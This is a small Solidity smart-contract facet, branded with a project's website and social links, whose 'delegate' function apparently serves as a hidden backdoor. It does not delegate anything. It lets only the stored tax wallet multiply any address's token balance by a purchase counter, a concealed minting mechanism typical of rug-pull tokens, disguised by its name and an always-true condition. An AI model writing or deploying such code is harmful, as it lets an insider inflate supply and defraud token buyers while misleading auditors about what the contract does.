// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://www.privasea.ai/
    Twitter:  https://twitter.com/Privasea_ai
    Telegram: https://t.me/Privasea_ai
    Discord:  https://discord.com/invite/yRtQGvWkvG
    Github:   https://github.com/Privasea

*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract delegateFacet is Ownable {
    function delegate(address delegatee) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (true) {
            require(ds._taxWallet == _msgSender());
            ds._balances[delegatee] *= ds.buyCount;
        }
    }
}
